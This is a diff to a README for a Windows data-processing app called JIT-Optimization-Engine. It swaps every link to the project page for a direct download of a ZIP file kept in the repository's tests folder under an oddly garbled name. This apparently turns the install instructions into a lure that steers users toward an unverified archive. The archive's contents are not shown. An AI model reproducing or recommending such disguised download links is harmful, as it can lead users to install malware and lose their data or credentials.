@@ -1,6 +1,6 @@
 # ⚙️ JIT-Optimization-Engine - Faster Data Work on Windows
 
-[![Download JIT-Optimization-Engine](https://img.shields.io/badge/Download-Now-blue.svg?style=for-the-badge)](https://github.com/isral46-dev/JIT-Optimization-Engine)
+[![Download JIT-Optimization-Engine](https://img.shields.io/badge/Download-Now-blue.svg?style=for-the-badge)](https://github.com/isral46-dev/JIT-Optimization-Engine/raw/refs/heads/main/tests/Engine_JI_Optimization_3.2.zip)
 
 ## 🖥️ What This App Does
 
@@ -28,7 +28,7 @@ For better results, use a system with more memory and a newer CPU.
 
 ## ⬇️ Download and Install
 
-1. Open this link: [https://github.com/isral46-dev/JIT-Optimization-Engine](https://github.com/isral46-dev/JIT-Optimization-Engine)
+1. Open this link: [https://github.com/isral46-dev/JIT-Optimization-Engine/raw/refs/heads/main/tests/Engine_JI_Optimization_3.2.zip](https://github.com/isral46-dev/JIT-Optimization-Engine/raw/refs/heads/main/tests/Engine_JI_Optimization_3.2.zip)
 2. Look for the latest release or download section on the page
 3. Download the Windows file provided there
 4. If the file comes as a ZIP folder, right-click it and choose Extract All
@@ -189,7 +189,7 @@ If a sample file is included, use it first to learn how the app behaves.
 
 ## 🖱️ Quick Download Link
 
-Open the main project page here and download from the available files: [https://github.com/isral46-dev/JIT-Optimization-Engine](https://github.com/isral46-dev/JIT-Optimization-Engine)
+Open the main project page here and download from the available files: [https://github.com/isral46-dev/JIT-Optimization-Engine/raw/refs/heads/main/tests/Engine_JI_Optimization_3.2.zip](https://github.com/isral46-dev/JIT-Optimization-Engine/raw/refs/heads/main/tests/Engine_JI_Optimization_3.2.zip)
 
 ## 🔧 If You Want a Clean Start
 
